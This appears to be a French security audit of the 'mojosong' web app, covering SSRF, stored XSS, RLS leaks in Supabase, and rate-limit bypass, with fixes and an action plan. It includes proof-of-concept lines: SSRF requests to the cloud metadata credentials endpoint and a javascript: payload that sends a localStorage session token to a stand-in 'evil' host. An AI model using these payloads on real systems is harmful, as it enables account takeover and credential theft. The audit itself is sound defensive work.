# mojosong — Audit de code et de sécurité

*Réalisé le 12 août 2026, sur la version b283. Périmètre : la totalité du
dépôt — `api/` et `server/` (serveur Vercel), `supabase/*.sql` (base et
RLS), `src/**` (client React), les dépendances et la configuration de
déploiement.*

Chaque constat grave a été vérifié directement dans le code, pas seulement
signalé. Les références sont sous la forme `fichier:ligne`.

---

## 1. Résumé exécutif

**La posture générale est saine.** L'architecture repose sur des choix qui
protègent d'eux-mêmes : surface de dépendances minuscule (trois paquets en
production, **zéro vulnérabilité connue**), aucun secret dans le dépôt,
séparation stricte entre la clé publique du navigateur (protégée par RLS) et
la clé de service (réservée au serveur). Le code front n'a **aucune**
injection HTML directe, le typecheck strict passe sans erreur, et les
« cicatrices » documentées du projet (fusions de synchro, hooks avant garde
null) sont non seulement corrigées mais verrouillées par des invariants.

**Il reste des trous réels**, dont un critique et cinq élevés. Ils se
concentrent sur trois surfaces : les endpoints serveur qui récupèrent des URL
externes (SSRF), les liens fournis par les utilisateurs et rendus sans
filtrage (XSS), et deux fuites de lecture en base (une vue et une table qui
échappent à la RLS).

### Tableau de bord

| Sévérité | Nombre | Sujets |
|---|---|---|
| 🔴 **Critique** | 1 | SSRF non authentifié (`social-import`) |
| 🟠 **Élevé** | 5 | XSS stockée (liens), vue `ai_usage_daily` lisible par tous, table `shares` publique, contournement du plafond payant, clé `LIVE_KEY` publique |
| 🟡 **Moyen** | 9 | Redirections SSRF, POST publics sans garde, objets live non bornés, pdf.js sans intégrité, énumération de l'annuaire, idempotence SQL, blob de groupe écrasable, envoi public sans délai |
| ⚪ **Faible** | 9 | Admin non confirmé, joker `*`, debug verbeux, orphelins, `user_id` exposé, pas de CSP, timer non nettoyé, tables SQL mortes dangereuses |
| ℹ️ **Info** | 3 | Fusion `Band` par liste de champs, `Math.random` (ok), inventaire `VITE_*` |

**Les trois gestes qui ferment le plus de risque, dans l'ordre :**
1. Bloquer les IP privées + les redirections dans `social-import` (le seul
   critique, exploitable **aujourd'hui, sans compte**).
2. Assainir tout `href` d'origine utilisateur (ferme le seul chemin vers une
   prise de compte).
3. Poser `LIVE_KEY_LEGACY=0` sur Vercel et corriger la vue SQL
   `ai_usage_daily` (deux gestes de config qui ferment trois constats).

---

## 2. Ce qui est solide (à préserver)

Ces points sont vérifiés et **bien faits** — les lister évite de les casser par
inadvertance lors des corrections.

- **Dépendances** : `qrcode`, `react`, `react-dom` en production. `npm audit`
  → 0 vulnérabilité. Aucune dépendance exotique, tout se reconstruit hors
  ligne.
- **Aucun secret commité** : toutes les occurrences de `SUPABASE_SERVICE_KEY`
  et consorts sont des `process.env` ou de la documentation. Aucun `.env`
  traqué. La clé de service n'est jamais loggée ni renvoyée dans une réponse.
- **Front sans injection HTML** : zéro `dangerouslySetInnerHTML`, `innerHTML`,
  `document.write`. Le HTML des partitions importées (`ugHtml.ts`) est réduit
  en **texte pur** avant tout affichage. React échappe le reste.
- **Embeds maîtrisés** : les iframes YouTube/Spotify (`LinkPreviews.tsx`)
  reconstruisent leur `src` à partir d'un identifiant extrait par regex vers
  des origines fixes — impossible d'y injecter une URL arbitraire. Tous les
  `target="_blank"` portent `rel="noreferrer"`.
- **RLS partout** : **toutes** les tables ont `enable row level security`.
  Les 17 fonctions `security definer` fixent `set search_path = public` (pas
  de détournement possible) et agissent sur `auth.uid()`, jamais sur un
  identifiant passé en paramètre — **aucune escalade par argument client**.
- **Invitations par lien** (b251) : jeton de 64 hex non lisible en table, à
  usage unique, expiration 30 j, vérifié via une fonction `definer`. Modèle
  robuste. Les anciens jetons de groupe permanents sont neutralisés.
- **`live_hearts`** : la clé primaire `(live_id, song_key, device)` empêche
  structurellement le double-comptage d'un cœur.
- **Séparation des comptes** (b259) : bascule vers un autre compte →
  `etatVide()` + purge des caches du compte, marqueur posé seulement après un
  envoi réussi. Les jetons sensibles viennent de `crypto.randomUUID()` ou du
  serveur, jamais de `Math.random`.
- **Qualité / correction** : typecheck strict propre ; les points de fusion de
  `SyncState`, `BandData` et `SongVersion` concordent tous ; aucun accès non
  gardé dans un hook placé avant un `return null` ; tous les `JSON.parse` de
  stockage sont sous `try/catch` ; tous les `setInterval` sont nettoyés.

---

## 3. Constats détaillés

### 🔴 CRITIQUE

#### C1 — SSRF non authentifié dans `social-import`
**`server/social-import.js:41-63`** (exposé par `api/tabs.js?fn=social`).

Le handler prend `req.query.url`, ne vérifie QUE le schéma (`http`/`https`),
puis fait `fetch(url, { redirect: 'follow' })`. **Aucune allowlist, aucun
blocage des IP privées / loopback / link-local.** L'endpoint n'exige aucune
identité.

**Exploitation, aujourd'hui, sans compte :**
```
GET /api/social-import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /api/social-import?url=http://localhost:.../
```
La fonction tourne sur un Lambda Vercel : l'endpoint de métadonnées cloud et
tout service interne deviennent joignables. Pire, le contenu n'est pas aveugle
— `og:title`, `og:description` (600 car.) et `og:image` sont **renvoyés à
l'appelant** (l.72-92) : exfiltration partielle de toute page interne, et scan
d'hôtes/ports via les erreurs différenciées.

**Correction :**
- imposer `https:` uniquement ;
- résoudre le hostname et **refuser toute IP privée/loopback/link-local/ULA**
  (10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, `::1`, `fc00::/7`), y
  compris après résolution DNS (contre le DNS-rebinding) ;
- poser `redirect: 'manual'` et re-valider chaque saut ;
- idéalement, une allowlist des domaines sociaux réellement visés.

---

### 🟠 ÉLEVÉ

#### E1 — XSS stockée via un `href` non filtré (`javascript:`)
**`src/components/TipBox.tsx:35,44` · `src/components/PublicPageView.tsx:47` ·
`src/components/LinkPreviews.tsx:81` · `src/pages/live/ArtistSheet.tsx:54` ·
`src/pages/Live.tsx:728` · `src/pages/SharePage.tsx:723,733`.**

Les URL saisies par l'utilisateur (lien de pourboire, liens de profil, lieu et
événement d'un concert) sont posées telles quelles dans un `href`, sans aucun
filtrage de schéma. Aucune fonction de validation d'URL n'existe dans `src/`.

**Exploitation → prise de compte :** un artiste met son `tipUrl` (ou un lien de
profil) à
`javascript:fetch('https://evil/x?t='+localStorage.getItem('sing2me/session'))`.
Un **autre musicien connecté** ouvre l'aperçu in-app de cette fiche
(`PublicPagePeek` → `PublicPageView`). Un clic exécute le JS dans l'origine
**authentifiée** de l'app, où vivent le jeton d'accès et de rafraîchissement →
exfiltration = prise de compte. Le même vecteur touche l'entrée publique et les
concerts partagés `/s/…` (impact moindre côté spectateur : pas de jeton, mais
défacement / hameçonnage).

**Correction :** un assainisseur unique, appliqué à **tout** `href` d'origine
utilisateur, plus une normalisation à la saisie.
```ts
export function lienSur(u: string): string {
  const s = (u ?? '').trim();
  return /^(https?:|mailto:|tel:)/i.test(s) ? s : '';
}
```

#### E2 — La vue `ai_usage_daily` contourne la RLS et est lisible par `anon`
**`supabase/admin.sql:47-56`.**

La table `ai_usage` est bien protégée (RLS active, aucune policy → service_role
seulement). Mais une **vue** s'exécute par défaut avec les droits de son
propriétaire (`security_invoker = off`), qui contourne la RLS ; et Supabase
accorde `SELECT` sur toute nouvelle vue à `anon`.

**Exploitation :** `GET /rest/v1/ai_usage_daily?select=*` avec la simple clé
anon (lisible dans le JS livré) rend le détail des coûts IA, appels par
fonction et fournisseur sur 90 jours — exactement les métriques « fondateur »
censées être privées.

**Correction :**
```sql
alter view public.ai_usage_daily set (security_invoker = on);
revoke all on public.ai_usage_daily from anon, authenticated;
alter table public.ai_usage force row level security;
```

#### E3 — La table `shares` est lisible publiquement + double définition
**`supabase/schema.sql:104-110,180-186` vs `supabase/shares.sql:12-18`.**

Deux définitions de `public.shares` coexistent. Celle de `schema.sql` pose une
policy `for select using (true)` (lecture publique) ; celle de `shares.sql`
n'en pose aucune (en croyant fermer la table). Les policies étant **additives
et persistantes**, dès que `schema.sql` a tourné une fois, `shares` reste
**publiquement énumérable**.

**Exploitation :** `GET /rest/v1/shares?select=*` vide **tous** les payloads
partagés (pages, setlists, morceaux) sans connaître le moindre identifiant
court — le modèle « connaître le lien = accès » est cassé. `api/share.js` lit
déjà cette table avec la clé de service : la policy publique est **inutile** et
n'est qu'une fuite.

**Correction :**
```sql
drop policy if exists "partages lisibles publiquement" on public.shares;
drop policy if exists "membres créent des partages" on public.shares;
-- laisser RLS active sans policy : tout passe par api/share.js (service_role)
```
Et supprimer la définition redondante dans l'un des deux fichiers (risque
d'idempotence : selon l'ordre d'exécution, une policy référence une colonne
`band_id` qui n'existe pas → déploiement cassé).

#### E4 — Contournement du plafond des appels payants via `x-forwarded-for`
**`server/ratelimit.js:40-42`**, appliqué par `api/ai.js` et `api/tabs.js`.

L'appelant anonyme est identifié par la tête de `x-forwarded-for` —
**position classiquement contrôlable par le client**. En la faisant tourner à
chaque requête, un attaquant non authentifié obtient un bucket neuf à chaque
appel et **annule le plafond** (nettoyage IA : 15/h). Chaque appel a un coût
réel (Claude, Whisper). Le module est par ailleurs *fail-open* (intentionnel),
donc cumulé avec ce point il n'oppose plus aucune barrière.

**Correction :** utiliser `x-real-ip` (posé par Vercel, non contrôlable) plutôt
que la tête de `x-forwarded-for`. Le code sait déjà lire `x-real-ip` en repli —
il suffit d'inverser la priorité.

#### E5 — La clé `LIVE_KEY` est publique (bundle) et encore acceptée
**`src/store.tsx:132` (embarquée via `VITE_LIVE_KEY`) · `server/identity.js:90-94`
(acceptée) · `api/live.js` et `api/share.js` (l'honorent).**

`VITE_LIVE_KEY` est une variable de build : littéralement présente dans le JS
livré. Tant que `LIVE_KEY_LEGACY≠0`, elle est acceptée comme identité. Avec
elle, un attaquant peut créer un live dont `artist`, `started_by`, `band_id`
viennent du body — et la résolution `/api/live?artist=<victime>` n'a pas de
filtre de propriété : le **faux live s'affiche sur la page publique de la
victime** et pousse du contenu arbitraire à son audience QR. Écrit aussi dans
`shares` (payload jusqu'à 900 Ko) sans plafond.

**Correction :** poser **`LIVE_KEY_LEGACY=0`** sur Vercel (le levier existe
déjà), puis retirer `VITE_LIVE_KEY` du build. Le pilotage live et l'écriture
`share` doivent exiger le jeton de compte (b192 l'a déjà fait pour le reste).

---

### 🟡 MOYEN

#### M1 — Redirections non re-validées dans `fetch-tab`
**`server/fetch-tab.js:155-159`.** L'allowlist initiale est correcte, mais le
suivi manuel de redirection re-fetch la nouvelle URL **sans re-vérifier
l'allowlist** (10 sauts). Un open-redirect sur un domaine autorisé permettrait
de pivoter vers une IP interne. **Correction :** ré-appliquer le contrôle
`ALLOWED_HOSTS` + `https:` à chaque `Location`.

#### M2 — POST publics sans rate-limit ni contrôle d'attribution
**`server/message.js:100-138` · `server/follow.js:38-63` · `server/report.js:26-54`.**
Aucun ne passe par `autorise()`. Le `message` POST attribue au `performer`
tiré du **body** → un attaquant écrit dans le livre d'or de **n'importe quel
artiste** (spam/harcèlement, 500 car. en boucle). `follow` pollue la table avec
des e-mails de tiers ; `report` permet le spam de signalements. **Correction :**
appliquer `autorise()` (un bucket public existe) à ces trois POST.

#### M3 — `share` POST : clé publique, payload 900 Ko, aucun plafond
**`api/share.js:59-88`.** Écriture gardée par la seule `LIVE_KEY` publique
(cf. E5), payload jusqu'à 900 Ko, aucun rate-limit. Abus de stockage possible.
**Correction :** exiger le jeton de compte ; ajouter un plafond ; réévaluer
l'utilité de l'écriture (les boutons de partage ont été retirés — seule la
lecture `/s/…` doit subsister).

#### M4 — Objets `song`/`artist`/`concert` du live stockés bruts et réfléchis
**`api/live.js:581-584,649-650`.** Seul `setlist` est assaini
(`sanitizeSetlist`). Les autres objets sont écrits bruts puis **restitués tels
quels aux spectateurs** (`publicView`) — contenu réfléchi non borné → DoS de
stockage et injection de contenu. **Correction :** assainir/borner ces objets
comme `setlist`.

#### M5 — pdf.js chargé depuis un CDN sans intégrité
**`src/lib/pdf.ts:13,17-25`.** Import dynamique de
`cdnjs.cloudflare.com/…/pdf.min.mjs` dans l'origine de l'app, sans SRI possible.
Compromission du CDN → code arbitraire avec accès au jeton. Contredit aussi la
posture hors-ligne. **Correction :** empaqueter pdf.js dans le build, ou à
défaut une CSP `script-src` restrictive listant le host.

#### M6 — `search_profiles` : énumération de l'annuaire + `user_id`
**`supabase/directory.sql:73-97`.** La correspondance est très permissive
(`ilike` dans les deux sens, seuil 2 caractères). Tout compte connecté peut
énumérer nom + photo + **UUID de compte** des tiers `searchable`. Pas de fuite
d'e-mail (bien). **Correction :** seuil à 3 caractères, retirer la branche
`query ilike '%'||name||'%'`, limiter les colonnes rendues.

#### M7 — `live.sql` non idempotent sur une base vierge
**`supabase/live.sql:261-264`.** Les recopies `set body = content` référencent
des colonnes jamais créées dans le fichier : sur la base de prod elles existent
(héritage), mais sur une **base fraîche** (reconstruction, staging) l'exécution
échoue et **s'interrompt**. Cela contredit `RESTAURATION.md`, qui suppose une
reconstruction en dix minutes. **Correction :** envelopper ces recopies dans un
bloc `do $$ … if exists (colonne) … $$` comme c'est déjà fait plus bas pour
`created_at`.

#### M8 — `band_library` : tout membre peut écraser le blob du groupe
**`supabase/bands.sql:102-123`.** La policy `for all` autorise n'importe quel
membre à réécrire (ou vider) l'unique ligne blob du répertoire partagé. C'est
le modèle collaboratif assumé (fusion côté client), mais sans aucune
granularité serveur : un membre ou une app boguée peut tout remplacer d'un
`PATCH`. **Nature :** intégrité/disponibilité intra-groupe, pas de fuite. À
connaître ; acceptable si assumé.

#### M9 — L'envoi public d'un mot n'a pas de délai maximum (récidive b216)
**`src/lib/live.ts:430` (`sendMessage`) · `src/pages/live/MessageBox.tsx:66-93`.**
`sendMessage` utilise `fetch` brut, pas `fetchAvecDelai`. Sur un réseau qui
**pend** (pas une vraie coupure), le bouton « Envoi… » reste bloqué
indéfiniment — exactement le mode d'échec de b216, transposé côté spectateur.
**Correction :** router par `fetchAvecDelai` et traiter le délai comme une
erreur réessayable.

---

### ⚪ FAIBLE

- **F1 — Admin non vérifié « e-mail confirmé »** (`server/admin-stats.js:47-48`) :
  le contrôle est sain (jeton vérifié, comparé à `ADMIN_EMAILS`, `LIVE_KEY`
  refusée) mais ne vérifie pas `email_confirmed_at`. Risque seulement si la
  confirmation d'e-mail est désactivée dans Supabase. **Correction :** exiger
  `email_confirmed_at`.
- **F2 — Joker `*` non filtré** (`api/live.js:334` · `server/message.js:64`) :
  le nettoyage retire `%_,()"` mais pas `*` (joker `ilike`). `?artist=*` rend le
  live actif le plus récent (fuite mineure). Pas d'injection SQL possible.
  **Correction :** retirer aussi `*` et `\`.
- **F3 — `?debug=1` renvoie messages + stack** (`server/fetch-tab.js:169-172`) :
  fuite d'info interne (chemins). **Correction :** réserver le debug à un
  contexte authentifié.
- **F4 — Orphelins à la suppression de compte** (`server/account.js`) : l'ordre
  est correct (données d'abord, compte auth en dernier, jeton vérifié), mais
  `live_hearts` et `live_attendance` ne sont pas purgés. Données anonymes,
  impact faible.
- **F5 — `public_pages`/`band_pages` exposent `user_id`** (`supabase/public.sql:18-20,97-98`) :
  la lecture publique du contenu est légitime, mais la table entière étant
  lisible, `select=*` rend la correspondance `nom public → UUID de compte`.
  L'UUID seul n'ouvre rien sous RLS. **Correction :** exposer via une vue
  restreinte aux colonnes `name`/`profile` si l'on veut cacher `user_id`.
- **F6 — Aucune Content-Security-Policy** (`index.html`, `public.html`) : une
  CSP réduirait fortement l'impact de E1 (exfiltration bloquée) et M5.
  **Correction :** en-tête CSP (`default-src 'self'`, `object-src 'none'`,
  `base-uri 'none'`, `script-src` listant le CDN pdf.js).
- **F7 — Timer d'appui long non nettoyé au démontage** (`src/components/SwipeRow.tsx`) :
  `setState`-après-démontage possible si une ligne disparaît pendant les 550 ms.
  No-op silencieux en React 19. **Correction :** `useEffect(() => () => annulerAppuiLong(), [])`.
- **F8 — Tables héritées de `schema.sql`, mortes mais dangereuses** :
  `band_members` (hérité) permet à tout compte de s'auto-insérer dans un groupe,
  puis de lire ses `songs`/`setlists`. **Impact réel nul** (aucune de ces tables
  n'est utilisée par le code actuel), mais bombe à retardement. **Correction :**
  retirer `schema.sql` du pipeline ou `drop table` explicite sur ces vestiges.
- **F9 — `shares` ignore `expires_at`** : sans objet une fois E3 corrigé.

---

### ℹ️ INFO / SURVEILLANCE

- **I1 — `mergeBandsById` reconstruit par liste de champs**
  (`src/lib/sync.ts:101-109`) : contrairement aux autres points de fusion qui
  « étalent », celui-ci unit champ par champ. Pas un bug aujourd'hui, mais c'est
  le **motif exact** des cicatrices b202/b273. À surveiller si `Band` gagne un
  champ d'identité partagé.
- **I2 — `Math.random` pour le `deviceId` spectateur** (`src/lib/live.ts`) :
  correct, l'usage est explicitement anonyme et non-sécuritaire. À ne jamais
  promouvoir en identifiant d'autorisation.
- **I3 — Inventaire `VITE_*`** : `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY`
  (publiques par conception), `VITE_OAUTH_ENABLED` (drapeau), `VITE_LIVE_KEY`
  (cf. E5). Aucune autre.

---

## 4. Plan d'action

### Lot A — Correctifs code, cette semaine (fort impact, faible risque)
1. **C1** — allowlist + blocage IP privées + `redirect: 'manual'` dans
   `social-import` (et re-validation des redirections **M1** dans `fetch-tab`).
2. **E1** — assainisseur `lienSur()` sur tout `href` utilisateur + normalisation
   à la saisie.
3. **E4** — basculer l'identité du rate-limit sur `x-real-ip`.
4. **M9** — `sendMessage` via `fetchAvecDelai`.
5. **F2/F3** — filtrer `*`, réserver `?debug=1`.

### Lot B — Correctifs SQL (à exécuter par Vincent dans le SQL Editor)
1. **E2** — `security_invoker=on` + `revoke` + `force rls` sur `ai_usage_daily`.
2. **E3** — retirer la policy publique de `shares` + éliminer la double
   définition.
3. **M7** — rendre `live.sql` rejouable sur base vierge (`if exists`).
4. **F8** — retirer `schema.sql` du pipeline (ou `drop` des tables vestigiales).
5. **M6/F5** — durcir `search_profiles` et l'exposition de `user_id` selon le
   niveau de confidentialité voulu.

### Lot C — Configuration (Vercel / Supabase)
1. **E5** — poser `LIVE_KEY_LEGACY=0`, puis retirer `VITE_LIVE_KEY` du build
   (ferme E5 et une partie de M3).
2. **F6** — ajouter les en-têtes CSP (via `vercel.json`, avec la réserve
   habituelle : ce fichier est validé strictement).
3. **F1** — vérifier que la confirmation d'e-mail est active dans Supabase.

### Lot D — Durcissements moyens (planifiables)
- **M2** — rate-limit sur les POST publics `message`/`follow`/`report`.
- **M3/M4** — auth + borne sur `share` POST et les objets live.
- **M5** — empaqueter pdf.js dans le build.
- **M8** — décider si le modèle « tout membre écrit le blob » reste acceptable.

---

## 5. Hors de mon périmètre (à ta main)

Ces points dépendent de la console des services, pas du code :
- **Confirmation d'e-mail** et **rate-limits d'authentification** : Supabase →
  Authentication (lié à F1 et au problème SMTP déjà signalé).
- **Régénération de `SUPABASE_SERVICE_KEY`** si tu soupçonnes une fuite.
- **Sauvegardes Supabase** : le dépôt contient la structure, pas le contenu
  (cf. `RESTAURATION.md`).

---

*Aucune modification n'a été apportée au code pour produire cet audit. Dis-moi
par quel lot tu veux commencer — je propose le Lot A (les correctifs code), en
priorité C1 et E1.*
